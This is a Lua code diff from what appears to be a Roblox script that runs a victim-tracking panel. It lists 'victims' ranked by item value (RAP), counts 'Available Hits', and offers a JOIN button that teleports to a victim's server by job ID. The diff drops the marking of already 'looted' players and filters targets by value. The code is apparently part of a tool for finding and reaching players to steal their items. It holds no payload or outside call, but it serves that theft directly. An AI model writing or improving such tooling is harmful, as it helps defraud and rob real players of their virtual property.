@@ -284,54 +284,48 @@ local function createRow(victim)
     i_new("UICorner", Row).CornerRadius = UDim.new(0, s(6))
     applyLedEffect(Row, s)
     local NameLbl = i_new("TextLabel", Row)
-    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = (victim.looted and "[LOOTED] " or "") .. victim.victim, Enum.Font.GothamBold, s(16), (victim.looted and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(255, 255, 255))
+    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = victim.victim, Enum.Font.GothamBold, s(16), Color3.fromRGB(255, 255, 255)
     NameLbl.Position, NameLbl.Size, NameLbl.BackgroundTransparency = UDim2.new(0, s(10), 0, s(5)), UDim2.new(0.5, 0, 0.5, 0), 1
     NameLbl.TextXAlignment = Enum.TextXAlignment.Left
     local ValLbl = i_new("TextLabel", Row)
-    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = (victim.looted and "NO LONGER TARGET" or "RAP: " .. formatValue(victim.val)), Enum.Font.Gotham, s(14), (victim.looted and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(100, 255, 100))
+    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = "RAP: " .. formatValue(victim.val), Enum.Font.Gotham, s(14), Color3.fromRGB(100, 255, 100)
     ValLbl.Position, ValLbl.Size, ValLbl.BackgroundTransparency = UDim2.new(0, s(10), 0.5, 0), UDim2.new(0.5, 0, 0.5, 0), 1
     ValLbl.TextXAlignment = Enum.TextXAlignment.Left
     local JoinBtn = i_new("TextButton", Row)
     JoinBtn.Size, JoinBtn.Position, JoinBtn.BackgroundColor3 = UDim2.new(0.2, 0, 0.6, 0), UDim2.new(0.55, 0, 0.2, 0), Color3.fromRGB(60, 60, 255)
     JoinBtn.Text, JoinBtn.Font, JoinBtn.TextColor3, JoinBtn.TextSize = "JOIN", Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(14)
-    JoinBtn.Visible = not victim.looted
     i_new("UICorner", JoinBtn).CornerRadius = UDim.new(0, s(6))
     applyLedEffect(JoinBtn, s)
     JoinBtn.MouseButton1Click:Connect(function()
         local jId = parseJobId(victim.link)
-        if jId then setStatus("Teleporting to " .. victim.victim); SafeTeleport(tonumber(parsePlaceId(victim.link) or 142823291), jId) end
+        if jId then 
+            setStatus("Teleporting to " .. victim.victim)
+            SafeTeleport(tonumber(parsePlaceId(victim.link) or 142823291), jId) 
+        end
     end)
 end
 
 local function refreshList()
-    for _, c in ipairs(Container:GetChildren()) do if not c:IsA("UIListLayout") then c:Destroy() end end
-    
-    local displayList = {}
-    local seenVictims = {}
-    
-    for _, v in ipairs(State.Victims) do
-        t_insert(displayList, v)
-        seenVictims[s_lower(v.victim)] = true
+    for _, c in ipairs(Container:GetChildren()) do 
+        if not c:IsA("UIListLayout") then c:Destroy() end 
     end
-    
-    -- Detect looted players in current server
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= LocalPlayer and not seenVictims[s_lower(p.Name)] then
-            t_insert(displayList, {victim = p.Name, val = 0, looted = true, link = ""})
+    local displayList = {}
+    for _, v in ipairs(State.Victims) do
+        if tonumber(v.val) and tonumber(v.val) > 0 then
+            t_insert(displayList, v)
         end
     end
-    
     t_sort(displayList, function(a, b) 
-        if a.looted ~= b.looted then return not a.looted end
         return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) 
     end)
-    
-    HitsLabel.Text = "Available Hits: " .. #State.Victims
+    HitsLabel.Text = "Available Hits: " .. #displayList
     if #displayList == 0 then
         local el = i_new("TextLabel", Container)
         el.Text, el.Size, el.BackgroundTransparency, el.TextColor3 = "No Active Targets", UDim2.new(1, 0, 0, s(40)), 1, Color3.fromRGB(150, 150, 150)
         el.Font, el.TextSize = Enum.Font.Gotham, s(14)
-    else for _, v in ipairs(displayList) do createRow(v) end end
+    else 
+        for _, v in ipairs(displayList) do createRow(v) end 
+    end
     Container.CanvasSize = UDim2.new(0, 0, 0, #displayList * s(70))
 end
 
@@ -371,7 +365,6 @@ local function AutoJoinStep()
         end
     end
     
-    -- If we get here, no valid target from the LATEST list is on this server
     State.CurrentTarget = nil
     TopHitLabel.Text = "Farming: None"
     
